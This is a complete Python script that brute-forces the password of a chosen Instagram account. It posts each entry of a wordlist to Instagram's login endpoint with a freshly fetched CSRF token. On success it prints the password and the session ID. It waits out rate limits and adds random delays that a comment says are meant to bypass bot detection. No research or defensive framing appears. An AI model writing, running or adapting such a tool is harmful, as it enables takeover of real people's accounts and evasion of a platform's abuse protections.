import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import time
import random

def instagram_bruteforce(username, wordlist_path):
    url = "https://www.instagram.com/accounts/login/ajax/"
    
    # Setup session with retry logic and proxy support (optional)
    session = requests.Session()
    retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
    session.mount('https://', HTTPAdapter(max_retries=retries))
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Instagram-AJAX": "1",
        "X-CSRFToken": "__dummy_token__" # Will be updated dynamically after first request
    }

    # Initial request to get CSRF token
    try:
        pre_req = requests.get("https://www.instagram.com/accounts/login/ajax/", headers=headers)
        csrf_token = pre_req.cookies.get('csrftoken')
        if csrf_token:
            headers["X-CSRFToken"] = csrf_token
            headers["Cookie"] = f"csrftoken={csrf_token}"
    except Exception as e:
        print(f"Failed to get CSRF token: {e}")
        return

    print(f"Starting brute-force attack on @{username}...")
    
    try:
        with open(wordlist_path, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Wordlist file '{wordlist_path}' not found.")
        return

    total_attempts = len(passwords)
    print(f"Total passwords to try: {total_attempts}")

    for index, password in enumerate(passwords):
        payload = {
            "username": username,
            "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}::{password}",
            "opt_into_one_tap": "false",
            "trust_device_data": ""
        }

        try:
            response = session.post(url, data=payload, headers=headers, allow_redirects=False, timeout=10)
            
            # Check for success indicators
            if "logged_in" in response.text or response.status_code == 200 and '"user":{' in response.text:
                print(f"\n[SUCCESS] Credentials Found!")
                print(f"Username: {username}")
                print(f"Password: {password}")
                
                # Extract cookie for session persistence (optional)
                if response.cookies.get('sessionid'):
                    print(f"Session ID: {response.cookies.get('sessionid')}")
                return
            
            # Check for specific error messages
            if "bad_password" in response.text:
                pass # Continue
            elif "too_many_attempts" in response.text:
                print("[WARN] Rate limit hit. Sleeping for 60 seconds.")
                time.sleep(60)
            elif "unknown_user" in response.text:
                print("[INFO] Username does not exist.")
                return

        except Exception as e:
            print(f"Request error: {e}")
            continue

        # Random sleep to bypass basic bot detection
        time.sleep(random.uniform(1.5, 3.5))

        if (index + 1) % 100 == 0:
            print(f"Progress: {index + 1}/{total_attempts} attempts completed.")

    print(f"All passwords exhausted. No valid credentials found for @{username}.")

# Usage
target_user = input("Enter Instagram Username: ")
wordlist_file = input("Enter path to password wordlist (e.g., rockyou.txt): ")

instagram_bruteforce(target_user, wordlist_file)
